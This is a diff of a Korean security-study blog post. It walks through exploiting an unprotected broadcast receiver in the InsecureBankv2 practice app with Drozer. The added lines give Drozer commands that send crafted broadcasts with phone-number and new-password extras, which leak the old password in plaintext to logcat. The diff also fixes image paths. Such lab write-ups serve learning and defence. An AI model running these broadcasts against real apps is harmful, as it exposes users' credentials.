@@ -24,7 +24,7 @@ author_profile: false
 <br>
 브로드캐스트 리시버는 BroadcastReceiver 클래스의 서브클래스로 구현되며, 각 메시지를 intent 객체 파라미터로 수신하는 onReceiver() 메서드를 재정의 한다.
 
-![그림 1-1](/assets/image/vuln/mobile-vuln/android-vuln/Flawed%20Broadcast%20Receivers/image.png)
+![그림 1-1](/assets/image/vuln/mobile-vuln/adnroid-vuln/Flawed%20Broadcast%20Receivers/image.png)
 
 [Example Code]
 
@@ -113,7 +113,7 @@ Drozer을 이용하여 실습을 진행해 보았다.
 run app.package.attacksurface com.android.insecurebankv2
 ```
 
-![그림 1-2](image1.png)
+![그림 1-2](/assets/image/vuln/mobile-vuln/adnroid-vuln/Flawed%20Broadcast%20Receivers/image1.png)
 - Drozer을 통해 취약점 유/무 확인이 가능하다.
 - 해당 내용으로는 content providers exported 가 1로 되어 있다. 이는 외부 어플리케이션에서 접근할 수 있는 서비스의 수를 의미하며, 외부 어플리케이션에서 해당 서비스를 시작할 수 있다. 해당 부분이 공격 표면이 된다.
 
@@ -121,17 +121,28 @@ run app.package.attacksurface com.android.insecurebankv2
 run app.broadcast.info -a com.android.insecurebankv2 -i
 ```
 
-![그림 1-3](image2.png)
+![그림 1-3](/assets/image/vuln/mobile-vuln/adnroid-vuln/Flawed%20Broadcast%20Receivers/image2.png)
 - 위 내용은 브로드캐스트 리시버 정보를 확인할 수 있다.
 - 살펴보면 com.android.insecurebankv2패키지의 MyBroadCastReceiver 라는 브로드캐스트 리시버가 포함되어 있다는 것을 알 수 있다. 앞에서 확인한 정보와 일치한다.
 - 권한 설정은 되어있지 않다.
 - 이후 새로운 브로드캐스트를 생성하여, 브로드캐스트 리시버에 정의된 액션을 수행할 수 있다.
 
 ```
-run app.broadcast.send --action theBroadcast --extra string phonenumber 1234 --extra string newpass crack
+run app.broadcast.send --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver
 ```
+위와 같이 --extra 옵션 없이 임의 브로드캐스트를 생성하여 전송하게 되면 logcat정보에 인자값이 없을 경우 발생하는 문자가 출력된다.
+
+![그림 1-4](/assets/image/vuln/mobile-vuln/adnroid-vuln/Flawed%20Broadcast%20Receivers/image-1.png)
 
 
+```
+run app.broadcast.send --action theBroadcast --extra string phonenumber 1234 --extra string newpass crack
+
+or 
+
+run app.broadcast.send --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 1234 --extra string newpass crack
+```
+위 코드들과 같이 보낼 경우 출력되는 메시지에는 기존에 사용하던 패스워드가 평문으로 포함되어 노출되게 된다. 즉, 계정의 패스워드는 변경되지 않지만 기존의 비밀번호는 노출되게 된다.
 
 # Referance
 - https://www.tutorialspoint.com/android/android_broadcast_receivers.htm
